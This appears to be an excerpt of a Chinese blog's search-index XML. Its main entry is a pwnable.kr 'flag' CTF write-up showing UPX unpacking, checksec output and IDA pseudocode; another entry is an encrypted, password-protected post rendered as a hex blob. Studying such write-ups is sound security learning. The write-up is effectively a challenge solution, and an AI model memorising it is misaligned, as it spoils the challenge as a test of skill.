      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《梦炬手册》五周年纪念版下载页]]></title>
    <url>%2F2020%2F05%2F04%2F2020.05.04%EF%BC%88116%EF%BC%89%2F</url>
    <content type="text"><![CDATA[点击下载文件]]></content>
  </entry>
  <entry>
    <title><![CDATA[Pwnable.kr的奇幻之旅（四）[flag]]]></title>
    <url>%2F2020%2F05%2F02%2F2020.05.02%EF%BC%88115%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 相关知识1.UPX 加壳 这里就简单介绍一下UPX加壳的原理，详细内容以后会进行专题研究。 通过上图可以看出最重要的部分应该为Compressed data和Stub，下面简单的讲一下UPX加壳的原理以及加壳后如何执行程序。 UPX的工作原理如下：首先将程序压缩， 所谓的压缩包括两方面： 一方面在程序的开头或者其他合适的地方插入一段代码 另一方面是将程序的其他地方做压缩（也就是上面讲到的压缩），压缩也可以叫做加密，因为压缩后的程序比较难看懂，原来的代码有很大的不同； 当程序执行时：实时的对程序解压缩。解压缩功能是在Stub节区插入的代码完成的功能，联起来就是：upx可以完成代码的压缩和实时解压执行。且不会影响程序的执行效率。 从上图可以看出在加壳后代码段的信息被压缩成Compressed Data节区，那么在运行时程序会根据Stub节区的内容将Compressed Data进行解压然后运行程序。 0x01 题目分析12@kali:~/Documents/CTF/PWN/pwnable.kr/flag# file flag flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header 查看文件信息，从得到的结果可以看出flag是一个64位ELF文件。 123456789root@kali:~/Documents/CTF/PWN/pwnable.kr/flag# checksec flag [*] &apos;/root/Documents/CTF/PWN/pwnable.kr/flag/flag&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Packer: Packed with UPX 检查flag文件开启了什么保护，通过结果可以看出： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 对GOT表可写可读 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 没有开启金丝雀保护 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 栈可执行 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④ 没有开启地址随机化 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤ 有可写可读可执行段 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑥ 进行UPX加壳 可以看出flag文件的大部分保护都没有开启，只是有了一个UPX加壳 0x02 解题步骤12345678910root@kali:~/Documents/CTF/PWN/pwnable.kr/flag# upx -d f1ag -o flag Ultimate Packer for eXecutables Copyright (C) 1996 - 2018UPX 3.95 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Aug 26th 2018 File size Ratio Format Name -------------------- ------ ----------- ----------- 883745 &lt;- 335288 37.94% linux/amd64 flagUnpacked 1 file. ① 对flag文件进行脱壳，得到一个脱壳后的flag，其中文件由335288bits扩展成883745bits，格式是Linux环境下的amd64 ② 然后用IDA-64打开脱壳后的flag文件，得到main函数伪代码： 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rax@1 puts("I will malloc() and strcpy the flag there. take it.", argv, envp); LODWORD(v3) = malloc(100LL); sub_400320(v3, flag); return 0;&#125; 可以看到sub_400320函数的第二个参数为flag，双击参数flag，得到我们想要的flag。 0x03 参考文章 upx原理分析 脱壳第三讲,UPX压缩壳,以及补充壳知识]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dan-Boneh密码学课程之学习笔记（持续更新）]]></title>
    <url>%2F2020%2F04%2F30%2F2020.04.30%EF%BC%88114%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Hey, password is required here. fcdb31cec15beef81adfe134e84d21dae9f4996996b90847cf158cf5f720421b35f4dcae9e3b56e0f25c121382af95727fcd302d1e61337b541bea2b9724e4c8bf18201024258fdf29d5366c3d5e94fadaa72182da1ce4323d16ad2dbb08f30459f705bafb639c1134ae200a879c28a753d3e34fce3d9e0b16b164ba68b61bf8c895a0b1daa5a0cab1cf1cb40d9c1b6a63b65d5cc134befa2ad1b4657675f25afc78199199b5470832c2d8b8ffe65c7facbf146306fe6da26e7d4e55f22ca400f519fdf3726d317158cdfde29dc814147cb7f8a8fa63986d209f67de988fb49392078656faf00b58b5158c4ed4eb8636bef25f2be17d2f37c0741cd73f390f6c53cff793a57a2f8b26dee2d5c68027d58ff756e0acac047273903bfb429c4d4695a48d9b75c7dad27b2fdbef459225e54889712935feefc39a4cb913ab3ec1bd84e58b8cb263ee9f95ae3d4e74f5cfca7fc3fb47867eecaa98d2fd6129caaf0f12e4c2c324a3348dbd04d15c4735598221f137db021b1e5037a51091fc8f33ac69f641810845cb7a2ba9d239b0edfa3337c7a7d342731da6164413d095f2208cd6164ac0aa15a95c5f545ce62ddd8386806a8ea408a0eb780ce5a8f46be64bf116ab087cb81ef154fc25a04a432e00bd5910f551c8475ea61c13dda66a809ba881e4d745e1b63360ef3341cc2cc0fe9ba628c7e4c59a4eecbafcceb4daac68040846b1543c9de553650bbab336e7ed3c71f120c2cadbc2d6b8d1818c3046bfa67131162faef807357414587a90decec5423ce82ed95491927a1222289595ab75c67532f1ddb9aeaff4f85ee2cd5c35ae8ce05e1572dbfcad392b02871c25f3a41ca784b3048f9911f6551b0b048422358052c846f8a415aa341220c2926c52461d64f0606fa39e9c37fe2c57e08eb788f7f7c28a3684d92abc2d309b5f7ec4d8c95d4411fb1cd68628b9e8578b98138b95f87b74e4dca34db91525192f864542c79637e793339e12b2af01f14e28900234e988734c94dff091523aa7f877633a8946831324857c265b806635f13bb9dd609f5d286e8489263dc05310ee6d23a0dbbc2c5698188a5bbd7c058cd912141215a94f112ac3913b16f63e692a344c4e08498e0e66acd0a4ed191cd5532f626bbbbd68dd2911d98e294ce5308c20301d7ce8a329160911787e95e05131469784e26b6d297001e57c2cd122e6e675e5afe0cd2f2b3c1c32858148a41edfb8e736426664c38c9309c55815427d41a27f71afd32487d6ae9d08d987575547a7579a4d3c5677d93fde5b9fa15d334b312538d2547f92fd55b07c7606dcc101787edaff8a9714a2269f842e233624ec1cebb24be281215816d66f832dafda219946e26f0715f5a13593251ccda07d2645046faac2fc4a0e6c6a5b6ab7e3b2e1a886ec930e59f87a4a8760a7d6803838eb727bbefef18ae3fab34fccbb527073650e84edb8be2fe827764989e1a812a2215e40dd1d68202e3dae3db1daaeddba119c2c3a647e79d9e6864a257825e3b1ac6b29aa4e07360e43a0a614dc47dd941095fd00faa9523c70aba1d9caca44e5a3d212cd02b946e7dbc677d599a89d0ca188e1c5d9d655e569249d21814b68ed2bd2f2f54ef5088a8c828f4bb6507e9e58a612d0aad882124760608011ac48fc1d87b7dbe184930056dfac5748d228fb580baa209c8b37387495f182e5282d423e28eaff4715aaee05fa3de1169988b7b489847bb709b5717aa11481fa396187cfc0ed2c5331e71a8868e5d1a2b49d06a76d9ef6c36d616b9efeb1c62305d3d6d4dea2aa6593f51c1753ceb9062b39d24253fda2df1af74ec7f7917babc3340c55e190e4901c562bc8fd8457fcf220e9d17a18b439d70766586926ede1a3e6ec84e0c0629aafff310f03b8c16bc29299b60e938f459965cfbf12a58c545a884fe3d5bd2789b00ce53d12e867077c9056eafcce90f6bbed81e8546a60afa200f56a2097ff6af8db46ca0728c08ac2df26f07d9681a40fc8b087847ce65e893ed3d2fdd145b211b381b8897dfc7eeca52790ad23a87c4ce34d854630a8cfe690d61cfbec862046530201c4bae2f1055e0db9cd3e72b9cdfbc0450d8baf1553c8fed919121cb91bf1490b94492485ff7d2ac294b4ac1bd5e110a33f15c14a70e901f30329972d039c0c38072d48da40a9995836bcedc483f92c1c4fbb6fd0076b46aad412760bec1512aa819f0892c7d474d7b0bce3707505f4a6c0504d826ddb2459142cd5df1b628c762706d52859730d7fc7639d4815d025ac098bf2946a0a9db59c6224f14a5f76f035d07aec1a99a83a992dea58b708cb969e68ea92fe32f9674c578f6edf0f130ec873a30c5a369f79a13ca8d1e3729d52f9813b294d58f48ddd9942c57ef98d07caada3c32c63499ec26140fa442fa2580b6b03331eed2370dbb4d340ecf23cd7b2ce5df276c5c40b3348a091f2be6ab45c01b164c75f03273c9dadc338a70270a3cad07a81088f1d2d7d9b9ba391fa6a4a348c82b4b30d30b0183a6dfc4e9d9b14048ca3fedc954f404138b7f4464a2fee5e1de61cca29d6b1718d5711f10f0f8d18eedb997716b5bd8c243d4381dd8db48b284c45f19db60a6ba73a728525cdea2f1f8d563e814ee8bdb5b2c0b361f2767c480f0d0c3024ad049e7c05cb8e00d080a982a57cf9f8015fc5feae6f7f9a0f1cf54d7c9b485eb6d6fb86bc5ef278944f0ba75ebbb9bbe7015afda1308c3a4ca841b87aac5e1d1a6981c5869a54d6de04d2924151697ee19c5c2ddba3ab6df2c8cf105869cfa763657a4862b22dcdb9c513dd73228b1f549bd895c8677d2b031d15f327e8471b1906f80fca357b755c66508e9e73d6a3c6ea8c6f045a620c4f5844cb8595bf8282f201153f51525fa6731008266c4754a77e052507853115fa6be6c7f50b54deae196c83c186c50b6c1dcc6488c186cfe3c0f7bee4aa88c750576591969050bb9a5303c97c5a4ce9812c8e7817ef9ff0e4a70b1e44652c369a51f4c550dfbecb7f6b326d8b4a1ee29247529adbe9b7c190b175d5510cb7f982f6067fbfb62aba0db0b3e75b4db23519de387b66b23711e00ad3c0538ec7bf009220c4feb34bf73488e99fc9c8969210fea4c6e7f02f844f82447ae1a0c0d22bbf6a7b4057982a6e000e2eb8a686203c8659ebb5fa7c9d3f5df219b1fbf2b5b84cf0780716f9ae225081cbdff840e66c6e54b01cbbc561ea6ae56a96b008aca7ce72a132b02b0758e8ffc1b3ec1c1d223e98d2e912c0a902dd098eb62a0c146a01e242b1c8e70cc89bd281551f8aa62a38ee3089ab8a65f91ee7d3108dfbf14f4e0e1ffd9f9d878a9943f2cb9533b03edaa91fcfada5cea9dcbc0aac6ff894ec57bdb599b084830ae5e44991150d50502fe293991d6113207adde86c1ab2777f61952a5aed71b473e8cce007f93e135369ba0d13d1181bb7385d7aa214be79ab4d6a73fad746afea55ec71f57661ab27e7f4fe11fdf37f671b573d674496a635359980444af4ecf22a140e4083a8268c76bcfe2dbca46f934ae47cdeb82a91546d038aaace30fd5f3412cf16cb4881842563aa84557d8bf0c9153dba6a4bcd28300ec8e6868e2ee32818751a2e8722506a4546b33369ac67d6ccaf404718fe78ecf27b4587d25f0f70bff25b3c151cd6cb0778f0138aa992740fd5c46612dbebaf412eb6bcff989153c5e9c2558109bba3e1b987424875f3d4a1b3f63405bef05467402cecd68861dc8ee6b8a66ca9a0dc88bfc58c1a635164400886ed3cf393b9c3220a1041ba2f39681c56f1f2852c964c9ee69297bd3627863a2b036bc41fbf78fc5f8c4083c69b271c88bbb4048d419cfcd44d473e844adbb7367f592b2bf6e1b69f9575046405129348b9fd73dd83a0a89ac54b0ff301c9b4259087d39ce0c45165715a39b1af359a9e0f98812b94aac27acdda6cfe6d6da910bfad13046a513ca1bb792f6d83443a02baa4780a062f512ee3ff653a48dd9a18fad6fe4c542a2d5f613ab7a635b32eec1b6a5559c08c2602c870bf31ef8a447c87deb0ba47342dbab237d1f3ad9d1ef0f39e5ae541448b3f13e047d336c5dd4e33150d9b0cc133e7fe9e9227ea444417cb4e22c696cccddd60be6744a71146d04862c681333095a24fedffa702c3df3e750c414b30128f7f9662df2ed8e87e0ebe2f535c96d1835fb454509ed70c9601ff2a38f047bcb8afd49489cfa6d70515037aac6cdd36fb976c9a4f99191ad1d18a6f672985b2e240a17fe69c3a3b31ef9852b54f1736677e7d89225b633747a28122f1ae323b22b1cf6aa8af22afc57444574629eaf6f012e7fe0082fe61ff9ea81c6526b2bb0a491672eb422c6a032632420fd280663be307689f85a096bc76bc5533fa1f8482657408e3c716e0f3c0598844cb76893e20fb49084f0e71b1310cd800903a0e1fd34270ed1180b44892000faf5633052b5164db724c11d9f0b6af213263abc9fdef1f6e6ec82c838d25bb26db4d71988b4e356bb6aa8c4173130db8952145168bc85c8c688f7c591c7de5ea723b5d03c92f98cc0231859a023fc2eb20df840fa493e4d03dbe2897c89200207e4c36657f9c51649db23597e558b43c7d454887d6215149dc90a83f6b9dd673a50d7bda01c8cd124814dc74ee468b06ce91d152796801da93360e30ee0a78d023865ba5d30a64f96ccca90c9bb8cc21a7730b6b13867aec50870bf4e895d31193e349570c2cbc8fa20564aedadd1d9d97ea01ff64a47064d882560467785670e7383dc5a873df2190cefc5b83a05cb7249f23ff208af2ba2ced9dd3c50b40e40e6a303bc884988678748cfbfbeacf27da8be491a1bd745d8c336789172ee8d96d73bac496cce4e23f537f94f14c313877ca52ee229a06708bc62cfd8c7cdbd42ae23c42dcad79316a3d32c77776d7684a61ee24188f5fbf3897fcd8fc00368e6db3eb2f8f04f240ac0cc04c4869eda155ef93c1fe092fe984ac4e9923e0b4f0d6af60e2c77bbe985d07cf5f4c477450fcaa5dbd030746eb1c6607438996b2a3be95d51c34d43d49bf719c6268108f54a51d8437dfcdb1dc96b4c29651c698c51b8d08cb95f0e2ea8ce15db06a0d55366fb2f9103558788d24ab26763e14a4bee0e0c31d73c64a99dceec2285c57b8871d0b53cd7943feea097c5bc5bb549ec67d168f1e97c67cc64e45035a9f01f8671dda8ae1ab85290ad20101ac54599eb652fd6f8dec73d4039286e79a191616b3cafca783a63df2f78831832b0d36cecb5777adebe3f78de8a47f23c1657319b5c6a889691972d6f3bfd5e774dadd920b43276c69d5a622418baedad786bde6854f41e86f1eadedd5b562b178753847695ee2a90ee6ec67f0767dea51318ac2fc0735c67fb50fed57b7f54845a4824cf9105cb7912a9be09d67d681f8fe5c70674bd509fb0aa10747902a0929f550b70f54d6e9f2a5af6cd5d8ea45e290dc5acbf9c6de0774f7611d9a82a10ebb63ce94cfd09d649773304cc8184e7455414435f1e473159d2b9ad4b53a7ad823d9203c2062a0cf04c4526c6da4d2cd99a7f1b8d2ec754bce1bbb73ab5809dd2ddfa75db54cde7ce51b8fd20824cced6dfbe7af76f016ca5f6a4e0a205ec0203a9f204e7cfc660eac15bae9e387a538806ab26a77545a10323620e2aa4f7ce68d5056f7d0557745d2afbfcfd45ef0bcffd7e9fa6bb4e5f69b60976d479900daa1122009bb1de2cf3be102c028870f3f62da7d7d091e6b0316e0cda9aafd824a56fedadb7886de09081481d999bfd67ee7913742f1dda54cf4c91c29300c5eaafa6b4a6fcbc6bdc5497d7ffff592d5de855f249adbe9c8d8489ae5b92b901ee0c9ec74e41e4373e42702a3c125872857d9b9d9d68a0e9d143b2d413403b8a576c35946488c7561e590a8e97f348c9d2d7efebe33bb283f7b6e8653cbbd7e851877472f5be0b16739f9fb708aff089fe36235807255c393bfce1f9bfeb14eed9e62b17e9498cec6413950684a0f3dd6e08f656aa4d67019e658d8a3ab07610188151e12fb22248dbad5c065ac4029d94ad2626c59c9af768d6def8a9ba574ee38932d9d1cd630df7cea477f39580a066d414d95a70afe9c29328fc9c5ee89cc0775041720155995863f6b9288297171cf6aa4816ca70b7f91b676f82d954c326fbb72d6d4071163b9565160ef88ac682ec979c90669d8b5482b45d79cc8d420a12a7ecc2f54e1070ad1c9d03802ef3ffee8bd525756dabe078e2b06651709f12902f670c2d4a3dab1f7a97913110b682f6e2e3a003119758ff62970d44b2b7546f1eeb75dcd2a57a732c383da4c32b17dc5980c732f9d2ec0574832dec8bcdf2a884be79f422fbc37b7f0f5238123e57cd13dd0856ce101402ec4223b0cd8b4b90081c17301f7e647a9c158d8e19018dbf636b028c7237db82cf4c46c0f4335c68603fb805d3ad3935e1bac87314c50e362ee8f2581e66c67dce31a29c95dc0f6508cf08ebf7c0340b351af1b3728088b940b1ce6eaddee90fe29b539ecf14d9df737df6ec0f9417da08f3437f300d281f8fca40b7e5e80d5fb036ebcfc81793f80ebb607d67858e4f441a983259ffcb9aee70ca2357e28fc5912e52d40996e535444e5fdd6c5ae96bc1346f57c84445e96371d82c3ef4e1cb4301fdac156b95c92239cb4af968493758832cece7dd306b2f2ab9cf47893b5dacac162ddc7ba3bdb9cd326a8064fcba0878060a95ccf139935f53b7609687f31acf5f7f3fb5178c5a980cd7d4cb2c7cbef56376ff0e9908aa643392b9cb0a8644ff8358878703440a69a05adbdc1432fcb95a53973170f4eb0e48f91f579353a2448c181079611c63f1cf1daa93e78464416a8b23bf358e3c064ec29519b64a2e2404af943eb16a3a4e026e451f309c881dbf2fcb121d9c0022cb4af00ebc5ae39370db6049ac4c94c873188ca7cb5a06b122368ce9124d8c548eb3e19388dc6e3daa0519b915de6dbd1724c9359aef24337d980b84d87170a511e5d20f590b57222ee03a86420e6bb2a4eaeb77a2fc7f7e155edfe009e20e2c3ab99e7bc7a5adb852ac610a6b7351e3918dc422e2f161d62ebe71d7fb378382ca7304608427b91124cbca2a72c4411d35a7580855e67072d482882a36b8ef40a824372658f35cd057120126190229c2921d3c880e0d91c2b81d121c699de6adaf3b8a322388715940bf8036e474ada39b706bbc6db5fcb114b1826451134c902c61cac2e8b6f38714b0dc84a5104746c7fde9a05c07f6a71735a6ecf7c9af7b69cbf5ccbc90288f890a3105b60ab66d0760f46e2abedfd80e9e7a43ece3d0f504ebee7cb43ae5b15450a928d08ffccc9c1e0cfd522a4ac851629112a52202442b96114d53875968fb88b661b165cc4f1669d548241b13dcb58224ff021e566f730859ddaec921098a1809a57618013c8466245dc30900413d01ddf7f1f3067a6fd601819ace95e51b937845646ffe786a4b2c54a80c465a17e5ad927c7800eb6054de73ee3704f9c58e1fa391cd0a97217621594f82871c9ed548bc0ea402398eb660227eb3bb1d361a82ddabff125dad1fd003b28a96bf1481687cfbed4ecea7f36e261d80a2ce443d747453e877460685fcf88e7c3ee9bdf618f5141ba5a73a1e8ba440e84dfe7412ab58d5caf5b10388883c574661d2099e0bd6ad88aa2ebced25d9fb119975a271360ae7734c4ba3078c7bbe2936af03cc9b5f491d1cab7982ad1860fef7ddde27ff600da83c12461aa8a43fc485c9eab43a16cfe8120f1147a4747bf5902ca6cbdaf516b1f22817071612e1fbe1ee455866a84f7dfba0dec65cc039aad703fc2a5f2b6f0dbf50afa92f931de952c0c90e4c672817afbea0276ad08771fecca01967aa902174dd4d3214b7abde48e72d303887126346442a1953fa847f22f4156a6e97f2a1353dc9515f1ac199d968f5c657aef94c21b37c927bf436326cf1ca1bf01d25084437e8ba50ad0be5aa4a9c3328e26891bb3bef9a3f10d6b0dc3d25a71637a9160a62afcd5f26a1160a847a9beac617e0067abb54a4457d875ce060dea9f9f7e02a7f050ff734ee22b24eb92830fa5d6d3db961f45be9e0bc415d401e4c4a98d833329ce90caab455f00ceb0f328132ecd3d1e28631f7fc316b4f053147ce1fb27fefd37bf86fc996490adad57bdc6d7f75b8aecbc088c8b67420e690453a833e1d83f72c879dfebcf52a773c7bb7616262478b6f36b1c0f3814bdd8f7f5b933c3977c39fae9e92fd90b335400fdb11f5c2d3bf68bc950f9b20d5e1fcb1cde380880cf578f270a71e700c13fa3b89030404e78953d81b966e60753905d86c6f3228f53dc6cea97558b851d36bd9814d415a3310596da07a5095e6f9774e15c9773aa1c6957a3fa26ae553c6bcfa30be57e74c88d9704faa57bd49899868908544f096c6e33fd7fcd96e12d5489c379ed6956056a46b026aedce074bd19f56c555c00528186f81e13821e3d4b7aef8038611b682c8e541d3f52c49b532a6e95f3ecf46c350d33bd7f01f55e55cbda9565a4672ce95b015c514db300f86a4b7f2f0246bbb4ebd58b9705e64abb1c66bc70620d79e5a9558422e4618c05eb8e52dc0d32f38781c56601b8e5abc67c818176aa2a8f979b2cf864ee811a3b0c94be9565d14a6ca3c8c9032985cc33da40129e564ecf3251a641f74ae0cb8ada2a753af85f50dc051f25d4a8105116798dafd17f6ebe8b6ada4670a9214ce3c0fff420ed623e4ac9fb3a88b42df124da42932f54b83beea451d7b14b93dcb0f8fd16497f61c785766abdca73dfe884d7738490bffd7917904e489fe2c0da6cefdf28eb16dd1c3bcd073a214fd3426d1415cd3cbd7887345fcd9bdd6503c8dcfc06dc41e559a21cc4d1fdef618b3dbcfb68aef9ac41698b538ac50a7f9d66b20619b38bbcbf64cc46070d89ed578ea4c18dc44badb1eb80366936b4d2cdc793f93de0fd141572eded1c85fcbba74f74d7f2f6040f5ff3ab63e0868a61a5217adec1b2f599d6ff3f1692e07050aa67ece33f9ee8c56e971513a0eb3f8fc5a2cca2153a94857ba64b10a2589f2ad8e8aedcf086002498af9b731ba8bd1e3849a2a27627c43ccae9893d19e3e6c5c524f461a24767f86f853985c66eea7e63c5670b5f5c00a12f51be4aebf465b98c97e62f76a34f02fc7e1f290e0743fb703c302e8e7c606309e3ece98580aae2ce6197c739777a51e12da22fb6c62bc64b0078681c3cfd61e698ceb4bbded224722730be304129c66ff91430cc74cba972c732a2f44017211e0eebc40d4a93e60c19445759870f8dcdf7ceec413a3b8629d780307fe95ca09e12cf2f9fcf436182d9d3428967d2895e8c4a9bbc7af94bcffd2906a25568af862486ea051163f71287424771c15caad9d2adc90591a3a6778111d10503fed70c0bca408b17c41e4454e42c78cd78fbc9996d6e8c7540b0ea8ab8a82b3a9ba087db8c5e05577369b0b46c9a92daa432ec9c7564d4722df6cd45ab5e07464b7d625af559f9796343e77c082865d27369053757438714c6d4971245005b59560a59d7f1d6e103b97e8e2d462a0647f0b51d27f4092aa4ac4f8181659c369d1753600989aeccf6f5d7c379f386d6b3680fc5862f82e54fb1b6ab29e22fac1892b3a51aca16c751d8fd911b69c19b0f74a1a218f395128abb6a7ea2a24754a5d6eac96f635fb6647e599ff0e3d7aafad3c325edd51cf1473bbd6ecfe5bdcfeba65649337c9b43c46c5915b876d349baa3ed6622ebde1d9f48587d20281077ff9373e195ea7e61b6e9f0cbc2ea773e5210b4024e81e86af25ffaba1eab60bf5afc7e4981affb1bc08104a699566a226c8c44052eb6857ce95783821fd6faf9cbe7653a1db7ece52c19107dfe5bdaddcd34d30fe05d1ce8c4c52739d0a8a7b72fb767a0ec5ce8ae4ed1cbd95ea42f3ea46e37b82df5a7904cb82acc11fe9d7b30e6f15548b27ee232a8a7b0c9b2d3d581dc20b54e7585dd5a1e43d23d6c92e7cb53d01fb607dba58a25da73ab3c4a6b39ed5fb7c12afabdd6a3677a77de65865645d7f4d77b5fa06d9a217e0e42f74106c82266ca6ed84dfa0742f3977664e08cfe845fa2abfd08dc2af42b5dbf19ef72ac932ee6a8c311673ed734635957e007347db7200d539b68c7221018a76642e63d12a5a7a6f8f3996942d1e6816bea478f3095ecdf7af9f4afe4eedaa9108ab391f7a476c7cae2f443c8f4bf9b1e6004072e04f97302945a617182626810daf6f3b1b6bb23c5ef1defb15a59b7651b8a4c53d4d04e0b6aeaf39e44caa412dfc1edb0c0aa12f678ff96a11253879fe96e3fb6a96d3b0ab182f81246fe964fafa333189e85aa373b57a588afea0d8b146d294c6fd0c06a44f92767f70eafb0ca03ed3ffad38d1d65a672d63ec67d734c50d66c629121b3085a007c832a479854532715cee7a4e3d393fb8cfd11f9cd534c561ed6fe0854bf655a922b021e26408a6d4173e8867d5012e4ff73264cb31b976121b80367f184da7fb6eefebc2f28dddd894f4000122417cc92470e6c257bd5f43859e6e16b97ada6c93d52fdf3c2c820bf56fbb552c132fbf125c3faf8fd8995a762b32802e4c1d21a59e418f69c3a25ecf9ad626c8ce9bd61494e5d43a17c65b3a35f2fab4550733edafe0253718a760b8466b5c140e0a6f29e308a651277c1f2d6c675272598afac89d73727c08d1a5bdf12f2d69ea621e713cbfbbba8653d7d0de1892bf0f3fd6e143155dff34c2244fc9a6c679e590dbb680eaa060b4b7453ee86a876fcf4d2207116449c67cf28f11008d46ffedb1ab54cfdb85f6fa7e673dc83f05d396c80dbbb5f7f81cfbb0370126fd64d5f71b28ec60aa3094f7fee283a4e200202ff6972eeb91c68de0925a76fb6e99c356c6632a7762fa4f96de85b1b9aa1bd076b62911d9c4c8eee0a42ac2a43a6b61024ae005eddbd999e62834442e8855cc33b397463d894605087d5d85605f310a7ea1a0bb48be7618feac21d985f1d91bc4a99fdf8614678c3c175fad32c8f4266d374d8c27a10709cf6ebd8d41c18c877f7b6761c7e762ad09fbc0ca7dd715512b49ba6df41b835c14830fc621f75c689e0c8f4c07c665b46dfc13796011561db7d8300570b0c22167ee6810675a1c4ab88d6a8a19c1eb8029efc9fde3eac78c439e9d57bdc853f5003596f6561e42d10ac87ad0d0428c4c364bf113daf4c5f0c48b66bac9ae692c31622b01508d5d4c4a6ca0a8d65c076653af68209b9d07ca4de1385731e6a466f9cb9426b8c4ee71635e74b74cd66814ecdf86d3246e285bd57db9b7f1abc2ddd3ddfd8e9b1e1230a5b021c69c9720067439fa759d3fba4fbb380e194a9ed86dd8648db66c276a02f3a408b23e0d6314a9e40ec7171817f08ef40e21de72b7bc7e47c3603317c7a75860ad5789b51cae5a0d9ca682d045a8d5d5269e872f10297d3b0ab003fd85de6f0cbc9ee67e2361662a89a9579ff329b953d84f5137c36e35b2a9a27bee07d31c2f2fd8aef3e79b820417fd990fd7a30fd1b3b75e9df1ce5114d7c0a43f05f6afb417d4647cd7757bd7df727ae02eaef470eefc3f8b2bafbec34bd2dc41d787fd86c38c34298d560c7e557a02a4a43be5e11dd0c457ae51028602c901a966764d90a9a5394b6b73249a40d759f3b563f5ef569e2eb07b6b275ebc267e9ae0855270f15b56e10b89f372002ae1789ccf264d27aa1912befc6fcb4a3dea8329ac67a1f0f49647809b0e1869cfb8287dabdbfbda05eaae7b4449a4a1044d4bad4cc9bb58a694a20c74362b241bb07214832249d92fff146da1f0e5cc011835556a29435dfe32f77e53a1dc353938fa0c016f3aa6cb991690a9b285c46bcf00c1864bbab3095c96f5ff275550c3658e3225c3db88eeea9ec6ba5d63ab1a859c248978deb5521c0ce97747790c2984880887522f783f393b2a9a622f8a8b830682066b6d0a0be925795871b649961f86ca29378c5ebed3223f8d0b5ac31e0b866b00ca3211010d2abf0fa4a1b729aa1daf38277cf77a58d67e792f0aee039c2530757ea58df9c56fa9b8d10939e53397107a03e3627217271ff7c29be46c912ac57a6b37e2a1ba25bab4f28dec70b5ed96de9af0a066f89e385f0da64cb680f7fbb4acd91dbfbd1d63d2bd4fce6938485401ea075fd45448ca718b334fc78f4881a2daf0db8aecc1c032f6a79fe9af3fc0f175ae8b8c6e180bcd1cb58ccc478d7d1c9ed680d37b8b5d693c8ef65097ebc03191ad1d8cff908f405d0e08ca944889569c5e2633d9b9caac5b73b82598ac75bffe2f6d0784c41a0a45a5b1d268af7040a73ee49c7279510252e448a5350985b6d0e5d19024ca00cbaf2ae39d7cc95f19cd5e0a33dc920e1bfdb04b89d06d93b526669fb6ea51878dd8028a30530b53806c973754147df5fe2780c64941fb74f2d3aff8da1308fd0bf31ffba96e65ec0b957506f6812ec029ff2cc304740aa9789dd12611ce6695db02e47485953ce4d0cefccff0553853a1d22a56c658ad86f0be66966234586d9c88e532a44a0506d8b087ac23fa9bbe58966029e29cee864ceab1e13806da2c4cb758ab223df47e38bcb79ccf819d28b26f43b080cb18de2f10950e507393487c417de538c4477da2fb0b4d40571b0d7ff19d63566d85cb62fd44b70b7852ea8f493028c80b92589bd1584bb7008a33558e0f2dd9379606f65400789cbc3b0d9ca9e3e16fe8fb23915014bf56409d7e503f3af730560526fd48669494c4cc7b891dc451423036c2bcc06da4a9389071d35667a5d31ee0e6c1676242e751c17fe8d7c7ea476e12ba2803b003bf4965bf7b1151f471d8f5ce19c69644fdd9600e21b775450fb9453333dd12bc8809e018e8fc0f333c660197d5e03d93151f30d3fd7334fa3e63dda268e562014ee87d0e87b948b6d1fdbe84f2ebda53bf1100f51a4ee54fa8ef6592eae06337dce6d456a574326dfd261f6e4844e27a34bd22c5c6cec45ec96dad495b50f67da9268e2113e1665a3489e1c2d18afb1cb6adec6ef4a9a1f5050b048d3b18fb1f3242113ca20c26745333a26e41166333508f028cfb216e42d874886db59946248e35343bd149bfae7d07183a67a6062890ef470190e054d7769767fd9b1fe4dff1378b18070487689ffab50a1253b4d0493778bb5bc14a9d8f2c8fb282cc8fab71191c8a2dbea3dcc40a81ef0eaf4e39dabb8546ed07d14e15025c044a11ceb36dc66c410161fe2629a6b244c8a778d730df9ed78c49027b8474e4426fc648ebd93adba3e96495402b745ada73938fca504a2b9b1a3a24e4d679061071763b4e9975bbf94a5d635551d49153c2fe8dd1a291103d65c341c330278c0dafa218e4391c854faba3c0e3eadbd2c0237be2dab689139d638eabe77732b3585b899a77b5c449eeec83e8787dcf36a18b73256da24d18c55456e046daa5fac216776b11277dd7207e3f829c5edd34d170e7df2681a57e69b016f422938f02320c8bdaeb7fd6bdcea231d3b14d72c3ff2a4b5474a3245ea13ee0a2ecc1a7cf24ad5784a0311067d08e89f48d2496c60aa9395fb483a2d488d3d85a6eebc84031b406213db150b49db1092225c26d988bfc46c0ef8279bb335b0d0728cd00143b29a5f505f65106d84c1cb3a691fa3712a597eb83bcaee864d979d043ec12a917a0be620f53188054a28205502f51d566da21ae0891c6c1268213b10e2d8e58e2d5f068a1069daeb15c1bb161809e9fe2546fc993ea07da6602c23fda14dd71a174d3663a120425c159e2ef78c256135cb8d6dcc7a311ad6fc24ce76cfcf6ad3c555dc69685ac08198a1bd485e7508beef329f14a6f5ced662dc68021f282ae6d4d263c6f8602f812660e89d08be6411a483e7e10c0de154bf0364b682302ebe4896f33103c0ca7b87c7a4e1217ada47138c28c3622b0b583c63e73a2ac8a2dc4d5d958f8e574b7233206ee217c9b72dc4d73f93b46cf36a848a5600e51bd476321684b5007c9bccc7027a6e9b156776df9c492c2174222a8438265647b5aadf7787ef3809e60918c4395d857df54c66ea1d4eb7ce1b64fc2e32cb02b9173942f8